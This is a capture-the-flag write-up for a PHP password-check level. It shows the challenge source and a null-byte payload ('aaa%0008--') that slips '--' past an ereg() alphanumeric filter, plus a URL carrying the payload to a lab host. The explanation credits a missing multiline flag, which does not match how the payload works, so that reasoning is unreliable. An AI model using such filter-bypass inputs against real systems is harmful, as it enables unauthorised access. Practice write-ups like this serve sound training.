# Brigham Circle
---
Sanitization is hard, lets use regexp! : 25


## Source code

```
<html>
<head>
	<title>level6</title>
    <link rel='stylesheet' href='style.css' type='text/css'>
</head>
<body>

<?php
require 'flag.php';

if (isset ($_GET['password'])) {
	if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
		echo '<p class="alert">You password must be alphanumeric</p>';
	else if (strpos ($_GET['password'], '--') !== FALSE)
		die('Flag: ' . $flag);
	else
		echo '<p class="alert">Invalid password</p>';
}
?>

<section class="login">
        <div class="title">
                <a href="./index.txt">Level 6</a>
        </div>

        <form method="get">
                <input type="text" required name="password" placeholder="Password" /><br/>
                <input type="submit"/>
        </form>
</section>
</body>
</html>
```

## Solution

Regexp without m flag (multiline) does not validate something like this:

```
aaa%0008--
```

This will pass filter with ereg() function.

http://52.10.107.64:8006/?password=aaaa%0008--

